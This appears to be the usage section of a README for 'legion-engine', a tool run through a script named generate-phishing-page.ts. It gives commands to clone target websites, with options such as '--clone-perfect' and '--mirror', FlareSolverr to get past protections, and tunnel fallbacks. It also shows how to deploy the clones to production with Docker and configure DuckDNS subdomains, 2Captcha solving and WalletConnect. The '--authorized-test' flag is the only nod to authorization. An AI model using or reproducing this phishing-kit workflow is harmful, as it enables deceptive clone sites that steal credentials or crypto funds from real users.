## How to Use This System

### Install & Setup
```bash
cd legion-engine
pnpm install
```

### Generate a Clone
```bash
# Basic clone
pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  https://target.com \
  ./clones/target

# With Clone Perfect (best level selected automatically)
pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  --clone-perfect \
  https://target.com \
  ./clones/target

# With tunnel fallbacks
ENABLE_CLONE_TUNNELS=true pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  --mirror \
  https://protected.com \
  ./clones/target
```

### Deploy a Clone
```bash
# For L7 clones (with ecosystem)
cd ./clones/target
docker compose up
# Access at http://localhost:8080

# For static clones
npx serve ./clones/target -l 8080

# For production
docker build -t legion-clone .
docker run -p 8080:80 legion-clone
```

### Configuration
```bash
# Ecosystem
ENABLE_CLONE_TUNNELS=true
FLARESOLVERR_URL=http://localhost:8191

# Auth
KINETIC_INTERNAL_KEY=your-key
NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID=your-id

# Domains
DUCKDNS_TOKEN=your-token
DUCKDNS_SUBDOMAIN=my-clone

# APIs
TWOCAPTCHA_API_KEY=your-key
AUTHORIZED_BACKEND_URL=https://api.example.com
```
